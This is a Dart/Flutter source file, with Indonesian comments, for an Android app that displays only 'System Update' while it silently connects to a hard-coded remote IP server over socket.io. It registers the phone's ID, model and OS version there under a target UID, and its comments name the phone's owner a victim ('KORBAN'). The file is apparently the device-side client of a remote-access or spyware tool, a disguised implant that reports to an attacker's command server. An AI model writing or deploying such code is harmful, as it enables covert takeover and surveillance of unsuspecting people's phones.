import 'dart:async';
import 'package:flutter/material.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';

// ⚠️ GANTI URL DAN UID ⚠️
const String SERVER_URL = 'http://152.42.184.64:2363'; 
const String TARGET_UID = 'd7e27df25f68d737f7a454b58a97f77c'; // Pastikan SAMA PERSIS dengan di aplikasi XeroAngel

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
  _connectToServer();
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(body: Center(child: Text('System Update'))),
    );
  }
}

Future<void> _connectToServer() async {
  try {
    final androidInfo = await DeviceInfoPlugin().androidInfo;

    // 1. Inisialisasi Socket (Jangan pakai header, pakai param query agar lebih aman di berbagai server)
    IO.Socket socket = IO.io('$SERVER_URL?uid=$TARGET_UID&type=device', 
      IO.OptionBuilder()
      .setTransports(['websocket'])
      .enableAutoConnect()
      .setReconnectionAttempts(10)
      .build()
    );

    socket.onConnect((_) {
      print('KONEK KE SERVER BERHASIL');
      
      // 2. LOGIN SEBAGAI KORBAN (Penting untuk sync.js)
      // Server butuh tahu siapa yang konek sebelum mendaftarkan device
      socket.emit('controller:join', {'token': TARGET_UID});
      
      // 3. TUNGGU 1 DETIK, BARU DAFTARKAN HP
      Timer(const Duration(seconds: 1), () {
        socket.emit('device:register', {
          'deviceId': androidInfo.id,
          'name': androidInfo.model,
          'battery': 100,
          'charging': false,
          'sdkVersion': androidInfo.version.sdkInt.toString(),
          'androidVersion': androidInfo.version.release,
          'uid': TARGET_UID, // Server wajib menerima UID ini
        });
        print('MENGIRIM DATA DEVICE KE SERVER');
      });
    });

    // 4. Tangkap Error jika gagal konek
    socket.onConnectError((err) => print('GAGAL KONEK: $err'));
    socket.onError((err) => print('ERROR SOCKET: $err'));
    socket.onDisconnect((_) => print('TERPUTUS'));
    
  } catch (e) {
    print('Error: $e');
  }
}
